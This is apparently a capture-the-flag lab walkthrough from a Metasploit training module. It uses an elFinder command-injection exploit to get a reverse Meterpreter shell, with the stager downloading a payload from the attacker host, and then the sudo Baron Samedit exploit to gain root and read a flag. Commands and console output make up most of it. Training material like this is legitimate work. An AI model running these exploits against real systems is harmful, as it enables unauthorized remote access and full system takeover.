
## Sessions

- Metasploit can manage multiple modules at the same time.
- To manage multiple modules `Sessions` are used in Metasploit.
- `Sessions` create dedicated control interfaces for the deployed modules.

---
## Questions and Solutions

- The target has a specific web application running that we can find by looking into the HTML source code. What is the name of that web application?
	- **elfinder**

Open the target IP and inspect the source code and there you can find HTML source code.

- Find the existing exploit in MSF and use it to get a shell on the target. What is the username of the user you obtained a shell with?
	- **www-data**

### Steps to Reproduce

```bash
$ msfconsole
msf > search elfinder

Matching Modules
================

   #  Name                                                               Disclosure Date  Rank       Check  Description
   -  ----                                                               ---------------  ----       -----  -----------
   0  exploit/multi/http/builderengine_upload_exec                       2016-09-18       excellent  Yes    BuilderEngine Arbitrary File Upload Vulnerability and execution
   1  exploit/unix/webapp/tikiwiki_upload_exec                           2016-07-11       excellent  Yes    Tiki Wiki Unauthenticated File Upload Vulnerability
   2  exploit/multi/http/wp_file_manager_rce                             2020-09-09       normal     Yes    WordPress File Manager Unauthenticated Remote Code Execution
   3  exploit/linux/http/elfinder_archive_cmd_injection                  2021-06-13       excellent  Yes    elFinder Archive Command Injection
   4  exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection  2019-02-26       excellent  Yes    elFinder PHP Connector exiftran Command Injection


Interact with a module by name or index. For example info 4, use 4 or use exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection

msf > use 3
[*] Using configured payload linux/x86/meterpreter/reverse_tcp
msf exploit(linux/http/elfinder_archive_cmd_injection) > set RHOSTS 10.129.203.52
RHOSTS => 10.129.203.52
msf exploit(linux/http/elfinder_archive_cmd_injection) > set LHOST 10.10.15.64
LHOST => 10.10.15.64
msf exploit(linux/http/elfinder_archive_cmd_injection) > show options

Module options (exploit/linux/http/elfinder_archive_cmd_injection):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: sapni, socks4, socks5, http, socks5h
   RHOSTS     10.129.203.52    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       The URI of elFinder
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT  8080             yes       The local port to listen on.


Payload options (linux/x86/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.15.64      yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target



View the full module info with the info, or info -d command.

msf exploit(linux/http/elfinder_archive_cmd_injection) > run
[*] Started reverse TCP handler on 10.10.15.64:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. elFinder running version 2.1.53
[*] Uploading file lhOUH.txt to elFinder
[+] Text file was successfully uploaded!
[*] Attempting to create archive kSEgFwLMn.zip
[+] Archive was successfully created!
[*] Using URL: http://10.10.15.64:8080/iGo9fsjVEg2CMh
[*] Client 10.129.203.52 (Wget/1.20.3 (linux-gnu)) requested /iGo9fsjVEg2CMh
[*] Sending payload to 10.129.203.52 (Wget/1.20.3 (linux-gnu))
[*] Command Stager progress -  53.04% done (61/115 bytes)
[*] Command Stager progress -  72.17% done (83/115 bytes)
[*] Sending stage (1062760 bytes) to 10.129.203.52
[*] Command Stager progress -  83.48% done (96/115 bytes)
[*] Command Stager progress - 100.00% done (115/115 bytes)
[+] Deleted lhOUH.txt
[+] Deleted kSEgFwLMn.zip
[*] Meterpreter session 1 opened (10.10.15.64:4444 -> 10.129.203.52:39098) at 2026-03-05 08:12:05 -0500
[*] Server stopped.

meterpreter > getuid
Server username: www-data
```


- The target system has an old version of Sudo running. Find the relevant exploit and get root access to the target system. Find the flag.txt file and submit the contents of it as the answer.
	- **HTB{redacted}**


From the below command we find out the **sudo** version is `1.8.31`

```bash
meterpreter > shell
Process 3344 created.
Channel 2 created.
sudo -V
Sudo version 1.8.31
Sudoers policy plugin version 1.8.31
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.31
```

Searching in the metasploit we found an appropriate version as listed below. For easy viewing I have provided a cropped view of the actual output because there will be numerous **sudo** related exploits so use according to the target **sudo** version.

```bash
msf exploit(linux/http/elfinder_archive_cmd_injection) > search sudo

Matching Modules
================

   #   Name                                                                       Disclosure Date  Rank       Check  Description
   -   ----                                                                       ---------------  ----       -----  -----------
   0   exploit/linux/misc/accellion_fta_mpipe2                                    2011-02-07       excellent  No     Accellion FTA MPIPE2 Command Execution
   1   payload/cmd/unix/adduser                                                   .                normal     No     Add user with useradd
   2   exploit/windows/fileformat/adobe_pdf_embedded_exe_nojs                     2010-03-29       excellent  No     Adobe PDF Escape EXE Social Engineering (No JavaScript)
   3   post/linux/gather/ansible_playbook_error_message_file_reader              ...(SNIP)...
   62  exploit/linux/local/sudo_baron_samedit                                     2021-01-26       excellent  Yes    Sudo Heap-Based Buffer Overflow
   63    \_ target: Automatic                                                     .                .          .      .
   64    \_ target: Ubuntu 20.04 x64 (sudo v1.8.31, libc v2.31)                   .                .          .      .
   65    \_ target: Ubuntu 20.04 x64 (sudo v1.8.31, libc v2.31) - alternative     .                .          .      .
   66    \_ target: Ubuntu 19.04 x64 (sudo v1.8.27, libc v2.29)                   .                .          .      .
   67    \_ target: Ubuntu 18.04 x64 (sudo v1.8.21, libc v2.27)                  ...(SNIP)...
```

### Steps to Reproduce

```bash
msf exploit(linux/http/elfinder_archive_cmd_injection) > use 64
[*] Additionally setting TARGET => Ubuntu 20.04 x64 (sudo v1.8.31, libc v2.31)
[*] No payload configured, defaulting to linux/x64/meterpreter/reverse_tcp
msf exploit(linux/local/sudo_baron_samedit) > set SESSION 1
SESSION => 1
msf exploit(linux/local/sudo_baron_samedit) > set LHOST 10.10.15.64
LHOST => 10.10.15.64
msf exploit(linux/local/sudo_baron_samedit) > show options

Module options (exploit/linux/local/sudo_baron_samedit):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   SESSION      1                yes       The session to run this module on
   WritableDir  /tmp             yes       A directory where you can write files.


Payload options (linux/x64/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.15.64      yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   1   Ubuntu 20.04 x64 (sudo v1.8.31, libc v2.31)



View the full module info with the info, or info -d command.

msf exploit(linux/local/sudo_baron_samedit) > run
[*] Started reverse TCP handler on 10.10.15.64:4444 
[!] SESSION may not be compatible with this module:
[!]  * incompatible session architecture: x86
[*] Running automatic check ("set AutoCheck false" to disable)
[!] The service is running, but could not be validated. sudo 1.8.31 may be a vulnerable build.
[*] Writing '/tmp/fzNX9wNF.py' (763 bytes) ...
[*] Writing '/tmp/libnss_G/C4eB0 .so.2' (540 bytes) ...
[*] Sending stage (3090404 bytes) to 10.129.203.52
[+] Deleted /tmp/fzNX9wNF.py
[+] Deleted /tmp/libnss_G/C4eB0 .so.2
[+] Deleted /tmp/libnss_G
[*] Meterpreter session 2 opened (10.10.15.64:4444 -> 10.129.203.52:39780) at 2026-03-05 09:08:13 -0500

meterpreter > ls
No entries exist in /tmp
meterpreter > cd /tmp
meterpreter > ls 
No entries exist in /tmp
meterpreter > cd ~
meterpreter > ls
Listing: /root
==============

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
100600/rw-------  178    fil   2022-05-16 11:35:30 -0400  .bash_history
100644/rw-r--r--  3106   fil   2022-05-16 11:34:51 -0400  .bashrc
040700/rwx------  4096   dir   2022-05-16 09:46:07 -0400  .cache
040700/rwx------  4096   dir   2022-05-16 09:46:06 -0400  .config
040755/rwxr-xr-x  4096   dir   2022-05-16 09:46:07 -0400  .local
100644/rw-r--r--  161    fil   2019-12-05 09:39:21 -0500  .profile
100644/rw-r--r--  75     fil   2022-05-16 04:45:33 -0400  .selected_editor
040700/rwx------  4096   dir   2021-10-06 13:37:09 -0400  .ssh
100600/rw-------  13300  fil   2022-05-16 11:34:51 -0400  .viminfo
100644/rw-r--r--  291    fil   2022-05-16 09:51:29 -0400  .wget-hsts
100644/rw-r--r--  24     fil   2022-05-16 11:18:40 -0400  flag.txt
040755/rwxr-xr-x  4096   dir   2021-10-06 13:37:19 -0400  snap

meterpreter > cat flag.txt
HTB{redacted}
```